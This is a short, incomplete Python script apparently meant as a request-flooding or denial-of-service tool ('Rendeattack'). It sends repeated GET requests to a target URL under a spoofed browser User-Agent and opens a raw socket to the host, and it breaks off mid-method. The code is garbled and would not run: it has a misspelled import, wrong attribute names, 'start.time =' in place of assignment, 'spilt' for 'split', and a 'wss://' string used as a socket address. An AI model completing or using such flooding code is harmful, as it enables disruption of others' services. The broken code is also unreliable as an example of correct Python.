import requests
import time
import socket
import threading
import argphase
from concurrent.futures import ThreadPoolExecutor

class Rendeattack:
    def __init__(self ,url, rate =100):
        self.url =url
        self.rate = rate
        self.interval = 1.0/ rate
        self.session = requests.Session()
        self.session.header.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 11.0; Win64; x64)',
            'Accept' :'*/*',
            'Conncection' : 'keep-active'
        })
    
    def make_request(self):
        try:
            start.time =time.time()
            response = self.session.get(self.url, timeout = 5)
            elapsed = time.time() - start

            if elapsed < self.interval * 0.8:
                time.sleep(self.interval -elapsed)

            ws = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            ws.connect(('wss://' + self.url.replace('https://','').spilt('/')[0], 443))

            